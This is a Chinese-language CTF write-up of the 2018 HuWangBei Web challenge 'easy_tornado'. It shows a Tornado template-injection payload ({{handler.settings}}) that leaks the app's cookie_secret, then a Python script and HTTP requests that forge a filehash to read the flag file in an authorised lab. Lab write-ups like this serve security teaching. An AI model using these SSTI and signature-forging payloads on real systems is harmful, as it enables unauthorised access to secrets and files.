---
title: 护网杯 2018 - Web - easy_tornado
date: 2026-11-14 18:29:00
categories:
  - CTF
  - 护网杯 2018
  - Web
tags:
  - Tornado SSTI
  - cookie_secret 泄漏
  - handler.settings
  - filehash 伪造
cover: /img/cover/green-hair-letter-girl.jpg
description: 护网杯 2018 Tornado 模板注入题，error 页 msg 可渲染模板并读 handler.settings 的 cookie_secret，按 md5 规则伪造 filehash 绕过校验读 flag。
keywords:
  - Tornado
  - SSTI
  - cookie_secret
  - handler.settings
  - MD5
ai: >-
  本题是护网杯 2018 的 Web 题 easy_tornado，难度 Easy，核心是 Tornado 模板注入配合 filehash 伪造。首页泄漏三个文件链接与提示：hints.txt 给出 filehash 等于对 cookie_secret 与文件名 md5 的拼接再取 md5 的算法，welcome.txt 提示 render，flag.txt 指出 flag 位于 fllllllllllllag 文件。error 页的 msg 参数会被当作模板渲染，虽然星号、加号、下划线等运算符被过滤返回 ORZ，但直接读取 handler.settings 即可拿到应用配置中的 cookie_secret。拿到密钥后按算法计算目标文件的 filehash，请求 file 接口即可绕过校验读出 flag。题目考察 SSTI 读配置与签名伪造的组合利用。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 护网杯 2018 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

首页泄漏三个文件链接：

- `/hints.txt`：`md5(cookie_secret+md5(filename))`（filehash 算法提示）
- `/welcome.txt`：`render`（提示 SSTI）
- `/flag.txt`：`flag in /fllllllllllllag`

题目 ID、练习场 ID、friendly_id 与提交记录 ID 等标识已脱敏。

## 漏洞分析

类型：Tornado 模板注入（SSTI）+ cookie_secret 泄漏 + filehash 伪造。

原理：filehash 算法为 `md5(cookie_secret + md5(filename))`（由 `/hints.txt` 提示）。`/file` 读取任意文件需正确 filehash。`/error?msg=` 存在 Tornado 模板注入，可读 `handler.settings` 泄漏 `cookie_secret`，从而伪造任意文件的 filehash。

## 利用过程

1. **定位 SSTI**：`/error?msg={{1}}` → `1`（模板执行）；`{{2*2}}`、`{{1+1}}` → `ORZ`（运算符 `*`、`+`、`_` 被过滤）。
2. **泄漏 cookie_secret**：`/error?msg={{handler.settings}}` →

```python
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'}
```

3. **计算 filehash 读 flag**：

```python
import hashlib
cookie_secret = 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'
filename = '/fllllllllllllag'
filehash = hashlib.md5((cookie_secret + hashlib.md5(filename.encode()).hexdigest()).encode()).hexdigest()
# filehash = d95e40114b826b6a9c4064f0be5d465f
```

4. **读 flag**：请求携带文件名与算出的 filehash。

```http
GET /file?filename=/fllllllllllllag&filehash=d95e40114b826b6a9c4064f0be5d465f HTTP/1.1
Host: target:8080
```

## 完整 EXP

payload 归档内容并入本节。

SSTI 泄漏 cookie_secret 的请求：

```http
GET /error?msg={{handler.settings}} HTTP/1.1
Host: target:8080
```

计算 filehash 并读 flag 的脚本与请求：

```python
import hashlib
cookie_secret = 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'
filename = '/fllllllllllllag'
filehash = hashlib.md5((cookie_secret + hashlib.md5(filename.encode()).hexdigest()).encode()).hexdigest()
# d95e40114b826b6a9c4064f0be5d465f
```

```http
GET /file?filename=/fllllllllllllag&filehash=d95e40114b826b6a9c4064f0be5d465f HTTP/1.1
Host: target:8080
```

关键信息：

- cookie_secret：`xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`
- flag 位置：`/fllllllllllllag`
- filehash 算法：`md5(cookie_secret + md5(filename))`

## Flag

```text
flag{xxxx}
```

提交记录：结果 accepted，+1 分（真实 flag 与提交 ID 已脱敏）。

## 踩坑与总结

- 运算符 `*`、`+`、`_` 被过滤（返回 `ORZ`），但 `{{handler.settings}}` 可直接读应用配置。
- 先 `/error?msg={{1}}` 确认模板执行，再读 `handler.settings` 拿 `cookie_secret`，避免盲目构造。
- filehash 是 `cookie_secret` 与「文件名 md5 的十六进制串」拼接后再取 md5，注意是内层 hexdigest 而非原始字节。
- 平台提交 accepted、+1 分，二次复现结果一致。
